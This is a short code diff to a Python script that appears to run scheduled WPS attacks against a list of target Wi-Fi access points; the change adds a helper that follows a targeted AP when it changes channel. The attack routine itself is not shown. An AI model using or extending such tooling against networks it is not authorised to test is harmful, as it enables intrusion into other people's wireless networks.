@@ -143,6 +143,19 @@ def _armed_now():
     return False
 
 
+def published_channel(bssid, hint, ttl=21600):
+    """Read the harvest-published current channel for this BSSID (BSSID-anchored rediscovery); fall
+    back to the config hint if missing/stale. Keeps WPS on the AP's real channel after a 2.4
+    auto-channel change or a 5GHz DFS move."""
+    try:
+        ch, ts = open(os.path.join(WORK, "channels", bssid.replace(":", ""))).read().split()
+        if time.time() - float(ts) < ttl:
+            return int(ch)
+    except Exception:
+        pass
+    return hint
+
+
 def preflight():
     """Refuse to run unless the required WPS tools are installed."""
     missing = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
@@ -382,6 +395,7 @@ def sweep():
         return
     try:
         for bssid, ch in TARGETS:
+            ch = published_channel(bssid, ch)   # follow the AP if it changed channel
             ensure_monitor(ch)
             try:
                 attack(bssid, ch)
